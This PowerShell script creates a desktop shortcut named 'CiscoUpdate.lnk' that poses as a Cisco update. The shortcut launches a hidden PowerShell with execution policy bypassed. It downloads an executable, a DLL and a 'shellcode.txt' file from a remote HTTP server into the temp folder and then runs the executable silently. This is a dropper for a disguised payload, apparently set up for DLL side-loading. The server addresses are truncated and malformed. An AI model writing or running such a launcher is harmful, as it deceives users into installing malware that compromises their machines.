# content

```
$WshShell = New-Object -ComObject WScript.Shell

$DesktopPath = [Environment]::GetFolderPath("Desktop")

$ShortcutPath = Join-Path $DesktopPath "CiscoUpdate.lnk"
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)

$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

$Shortcut.Arguments = @'
-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ErrorActionPreference='Continue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri 'http://192.16:8000/CiscoCollabHost.exe' -OutFile \"$env:TEMP\CiscoCollabHost.exe\"; Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168:8000/CiscoSparkLauncher.dll' -OutFile \"$env:TEMP\CiscoSparkLauncher.dll\"; Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168:8000/shellcode.txt' -OutFile \"$env:TEMP\shellcode.txt\"; Start-Process \"$env:TEMP\CiscoCollabHost.exe\" -WindowStyle Hidden"
'@

$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"
$Shortcut.WorkingDirectory = "$env:TEMP"
$Shortcut.Save()

```
